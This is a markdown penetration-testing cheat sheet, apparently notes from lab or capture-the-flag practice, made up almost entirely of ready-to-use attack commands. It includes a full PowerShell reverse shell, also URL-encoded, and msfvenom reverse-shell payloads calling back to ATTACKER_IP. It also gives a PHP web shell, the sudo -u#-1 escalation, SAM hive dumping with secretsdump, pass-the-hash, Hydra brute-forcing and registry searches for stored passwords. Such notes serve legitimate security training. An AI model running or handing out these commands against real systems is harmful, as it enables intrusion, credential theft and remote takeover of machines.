# Basic Commands

### Python

`python3 -m http.server PORT`

### RDP

`xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:ip_address /u:Administrator /p:'password'`

### SSH

`chmod 600 deployment_key.txt`
`ssh -i deployment_key.txt user@ip_address`

### SMB

`smbclient //IP_ADDRESS/SHARE`  
-U user  
-p port  
(username anonymous and no password for anonymous login)  
to download share:  
`smbget -R smb://IP_ADDRESS/SHARE`

### TCPDump

`sudo tcpdump port # -A`

### Windows

`sc qc` - get info about a service. See unquoted service paths.  
`sc stop/start` - stop and start services.  
`icacls` - check permissions.  
`icacls FILE /grant GROUP:PERMISSIONS`  
`whoami /priv`  
`wmic product get name,version,vendor` - list installed software and versions  
`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\FILE`  


# Brute-Forcing
### fcrackzip
`fcrackzip -b -v -u file.zip (to brute force)`
`fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u file.zip (dictionary)` 
### Hydra
`hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt IP_ADDRESS -t THREAD_COUNT PROTOCOL_NAME`
-s PORT (for non-default port numbers)  
-d to show debugging info  
`sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"`



# Enumeration

### Active Directory
`gpresult /r` (get domain controller computer is getting group policy from)  
`Set Logonserver`  

### Nmap
`nmap -sn ADDRESSRANGE`  
`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP`  
Windows default TTL is 128. Linux is something in 64 range. Ping can be used for OS detection.

### SMB
`smbclient -L IP_ADDRESS` 
-N for no password
`enum4linux -a IP_ADDRESS`
`smbmap -H IP_ADDRESS`
`put a` to check for write access
Find hostname:
`ping -a IP_ADDRESS`
`nbtstat -A IP_ADDRESS`



# Footholds

### PentestMonkey Cheatsheet
https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Shells

PHP  
/usr/share/webshells/php/php-reverse-shell.php

Powershell    
`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`  
URL-Encoded  
`powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`  

### Stabilize Shell
Python  
`python -c 'import pty;pty.spawn("/bin/bash")'`  

`export TERM=xterm`  
(ctrl+z)  
`stty raw -echo; fg`  

# Weaponization

### Windows
Payload for executing exe files with VBScript:
`Set shell = WScript.CreateObject("Wscript.Shell")`
`shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True`
`wscript PATH_TO_FILE` or `cscript PATH_TO_FILE`
Using txt file:
`wscript /e:VBScript c:\Users\thm\Desktop\payload.txt`
   
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=443 -f hta-psh -o thm.hta`


# Privesc

### GTFOBins
https://gtfobins.github.io

### Linux
`sudo -l`  
`sudo -u#-1 /bin/bash` (if ALL in output of above command and sudo 1.8.27 or prior)  
`sudo apache2 -f /etc/shadow` (reads first line if apache2 runs as sudo)  
`hostname`  
`cat /proc/version` OR `/etc/issue`  
`ps axjf` (process tree)  
`ps aux` (user info)  
`env`  
`cat /etc/shells`  
`find / -perm -u=s -type f 2>/dev/null`
world-writable files: /tmp, /dev/shm,/var/lock, /run/lock  
`find / -writable 2>/dev/null`  
`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`  
find world executable folders:  
`find / -perm -o x -type d 2>/dev/null`  
dev tools and supported languages  
`find / -name perl* 2>/dev/null` (gcc, python)  
`strings BINARY`  
`export PATH=$PATH:/place/with/the/file`  
`getcap -r / 2>/dev/null` (check for capabilities on binaries)  
`cat /etc/crontab`  
`cat /etc/exports` (NFS configuration)  
`showmount -e IP_ADDRESS`  


### Windows
Priv2Admin  
https://github.com/gtworek/Priv2Admin
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

`whoami /priv`
`net user`  
`net local` 
`net user USERNAME`  
Check for patches:  
`wmic qfe get Caption,Description,HotFixID,InstalledOn`
Leftover credentials from unattended installations:   
`C:\Unattend.xml`  
`C:\Windows\Panther\Unattend.xml`  
`C:\Windows\Panther\Unattend\Unattend.xml`  
`C:\Windows\system32\sysprep.inf`  
`C:\Windows\system32\sysprep\sysprep.xml`  

Retrieve password history from cmd.exe:  
type `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`  
Powershell:  
`type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`  

View saved credentials:  
`cmdkey /list`  
( to use creds )  
`runas /savecred /user:admin cmd.exe`  
`runas.exe /netonly /user:<domain>\<username> cmd.exe`  
Search registry for passwords:  
`reg query HKLM /f password /t REG_SZ /s`  

Generate malicious exe:  
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`  
Change path to malicious .exe on configurable service:  
`sc config SERVICE_NAME binPath= "C:\PATH_TO_MALICIOUS_EXE" obj= ACCOUNT`  

If SeBackup Privilege:  
`reg save hklm\system OUTFILE.hive`  
`reg save hklm\sam OUTFILE.hive`  
Copy to impacket-smbserver:  
`impacket-smbserver -smb2support -username USER -password PASSWORD SHARENAME DIRECTORY`  
`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`  

Pass the hash:  
`impacket-psexec -hashes HASH USER@IP_ADDRESS`  
`pth-winexe -U 'username%hash' //MACHINE_IP cmd.exe`  

Check Autorun:  
`reg query`   `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`  

AlwaysInstallElevated:  
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=53 -f msi -o reverse.msi`  
`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`  

Registry Search:
`reg query HKLM /f password /t REG_SZ /s`
`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
On Kali:
winexe -U 'admin%password' //10.10.125.210 cmd.exe


### RCE
PHP  
`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`  
( execute using URL/uploads/shell.php?cmd= )  
